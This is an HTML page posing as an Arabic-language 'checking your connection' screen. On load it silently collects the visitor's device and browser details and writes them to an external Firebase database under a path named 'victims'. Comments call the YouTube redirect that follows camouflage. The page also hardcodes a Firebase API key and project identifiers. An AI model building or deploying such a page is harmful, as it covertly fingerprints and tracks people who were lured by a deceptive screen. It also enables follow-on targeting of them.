<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Checking Connection...</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body>
    <script>
        // إعدادات مشروعك التي قدمتها
        const firebaseConfig = {
            apiKey: "AIzaSyCaArCXRtxCYXXHWwKBfx-CrXUCCBjx9C8",
            authDomain: "hercules-v2-109a5.firebaseapp.com",
            databaseURL: "https://hercules-v2-109a5-default-rtdb.firebaseio.com",
            projectId: "hercules-v2-109a5",
            storageBucket: "hercules-v2-109a5.firebasestorage.app",
            appId: "1:692698984260:android:80dca965ba306b5b7c3111"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // الحصول على الـ ID من الرابط
        const urlParams = new URLSearchParams(window.location.search);
        const vID = urlParams.get('id') || "Unknown_Device";

        // وظيفة سحب البيانات وإرسالها
        function hackSimulation() {
            const victimData = {
                model: navigator.platform,
                browser: navigator.userAgent,
                language: navigator.language,
                screen: window.screen.width + "x" + window.screen.height,
                online: navigator.onLine,
                visitTime: new Date().toLocaleString()
            };

            // إرسال البيانات لمسار "victims" في فايربيز
            database.ref('victims/' + vID).set(victimData)
            .then(() => {
                // توجيه الضحية لليوتيوب مثلاً للتمويه بعد سحب البيانات
                window.location.href = "https://www.youtube.com";
            });
        }

        window.onload = hackSimulation;
    </script>
    <div style="text-align: center; margin-top: 50px;">
        <h2>جاري فحص اتصالك، يرجى الانتظار...</h2>
    </div>
</body>
</html>
